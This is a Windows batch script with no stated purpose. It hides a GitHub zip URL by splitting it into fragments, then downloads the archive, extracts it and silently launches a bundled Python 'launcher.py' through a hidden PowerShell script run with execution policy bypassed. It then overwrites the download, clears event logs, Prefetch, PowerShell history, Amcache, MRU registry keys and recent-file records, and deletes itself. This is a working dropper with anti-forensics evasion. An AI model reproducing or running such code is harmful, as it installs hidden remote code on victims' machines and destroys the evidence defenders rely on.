@echo off
setlocal enabledelayedexpansion

if not "%1"=="worker" (
    set "tempbat=%TEMP%\~w!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!tempbat!" >nul 2>&1
    if exist "!tempbat!" (
        start /b cmd /c call "!tempbat!" worker
        timeout /t 2 /nobreak >nul
        del /f /q "%~f0" >nul 2>&1
    )
    exit /b
)

set "u1=ht"
set "u2=tps:"
set "u3=//gi"
set "u4=thu"
set "u5=b.co"
set "u6=m/br"
set "u7=aya"
set "u8=njh"
set "u9=oan"
set "u10=ce2"
set "u11=-co"
set "u12=lla"
set "u13=b/e"
set "u14=ncr"
set "u15=ipt"
set "u16=ado"
set "u17=/ar"
set "u18=chi"
set "u19=ve/"
set "u20=ref"
set "u21=s/h"
set "u22=ead"
set "u23=s/m"
set "u24=ain"
set "u25=.zi"
set "u26=p"

set "url=%u1%%u2%%u3%%u4%%u5%%u6%%u7%%u8%%u9%%u10%%u11%%u12%%u13%%u14%%u15%%u16%%u17%%u18%%u19%%u20%%u21%%u22%%u23%%u24%%u25%%u26%"

set "psfile=%TEMP%\~dl!RANDOM!.ps1"

(
echo $ErrorActionPreference='SilentlyContinue'
echo $u='%url%'
echo $z="$env:TEMP\~"+[guid]::NewGuid^(^).ToString^(^).Substring^(0,8^)+'.zip'
echo $x="$env:TEMP\~ex"+[guid]::NewGuid^(^).ToString^(^).Substring^(0,6^)
echo try{
echo [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
echo $ProgressPreference='SilentlyContinue'
echo Invoke-WebRequest -Uri $u -OutFile $z -UseBasicParsing -TimeoutSec 120
echo Expand-Archive -Path $z -DestinationPath $x -Force
echo $r=Get-ChildItem -Path $x -Recurse -Directory^|Where-Object{$_.Name -eq 'encriptado-main'}^|Select-Object -First 1
echo if^($r^){
echo $l=Join-Path $r.FullName 'launcher.py'
echo $p=Join-Path $r.FullName 'python_portable\python.exe'
echo if^((Test-Path $l^) -and (Test-Path $p^)^){
echo Set-Location $r.FullName
echo Start-Process -FilePath $p -ArgumentList "`"$l`"" -WindowStyle Hidden -NoNewWindow
echo Start-Sleep -Seconds 10
echo }
echo }
echo }catch{}
echo Start-Sleep -Seconds 3
echo if^(Test-Path $z^){
echo $s=^(Get-Item $z^).Length
echo if^($s -gt 0 -and $s -lt 100000000^){
echo for^($i=0;$i -lt 3;$i++^){
echo $b=New-Object byte[] $s
echo (New-Object Random^).NextBytes^($b^)
echo [IO.File]::WriteAllBytes^($z,$b^)
echo Start-Sleep -Milliseconds 500
echo }
echo }
echo Remove-Item -Path $z -Force
echo }
echo Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
echo Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU' -Name '*' -ErrorAction SilentlyContinue
echo Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU' -Name '*' -ErrorAction SilentlyContinue
echo Get-ChildItem 'C:\Windows\Prefetch\*.pf' -ErrorAction SilentlyContinue^|Remove-Item -Force -ErrorAction SilentlyContinue
echo Clear-RecycleBin -Force -Confirm:$false -ErrorAction SilentlyContinue
echo wevtutil cl Application 2^>$null
echo wevtutil cl System 2^>$null
echo Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
echo Get-ChildItem "$env:USERPROFILE\AppData\Local\Microsoft\Windows\Explorer" -Filter '*.db' -ErrorAction SilentlyContinue^|Remove-Item -Force -ErrorAction SilentlyContinue
echo Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Windows\AppCompat\Programs" -Filter 'Amcache*.hive' -ErrorAction SilentlyContinue^|Remove-Item -Force -ErrorAction SilentlyContinue
echo Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Windows\CoreApplicationData" -Recurse -Filter '*.db' -ErrorAction SilentlyContinue^|Remove-Item -Force -ErrorAction SilentlyContinue
echo Remove-Item "$env:USERPROFILE\AppData\Local\Microsoft\Windows\FileHistory" -Recurse -Force -ErrorAction SilentlyContinue
echo Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Recent" -Filter '*.lnk' -ErrorAction SilentlyContinue^|Remove-Item -Force -ErrorAction SilentlyContinue
echo Remove-Item -Path $PSCommandPath -Force -ErrorAction SilentlyContinue
) > "%psfile%"

powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%psfile%"

timeout /t 5 /nobreak >nul

set "cleanup=%TEMP%\~cl!RANDOM!.bat"
(
echo @echo off
echo timeout /t 8 /nobreak ^>nul
echo taskkill /f /im powershell.exe ^>nul 2^>^&1
echo del /f /q "%psfile%" ^>nul 2^>^&1
echo del /f /q "%~f0" ^>nul 2^>^&1
echo cd /d %%TEMP%%
echo ^(goto^) 2^>nul ^& del /f /q "%%~0" ^& exit
) > "%cleanup%"

start /b cmd /c call "%cleanup%"
exit